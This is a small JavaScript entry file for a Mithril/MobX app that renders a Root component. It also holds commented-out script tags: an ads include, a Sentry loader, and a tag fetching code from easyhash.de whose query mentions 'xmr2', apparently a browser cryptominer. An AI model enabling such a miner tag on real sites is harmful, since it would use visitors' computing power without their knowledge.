
import {s} from './store.js'
import {Root} from './root'
import {autorun, toJS} from 'mobx'
import m from "mithril"

autorun(function(){
    m.render(document.body, <Root></Root>)
})
// <script src="https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.xmr2" 
// onload
// >
// </script>
// <script src="static/ads.js"></script>


// var script = document.createElement("script")
// script.type = "text/javascript";
// script.onload = function () {
//     s.noSync.
// };
// script.src = "https://browser.sentry-cdn.com/5.5.0/bundle.min.js";
// script.integrity = "sha384-/kLYKYxlMDI1l+lhDHECQrq1Z4fnk/A32MWVF6rRnuE2WiOuAmg3wr3McNOG3Szi"
// script.crossorigin = "anonymous"
// document.getElementsByTagName("head")[0].appendChild(script);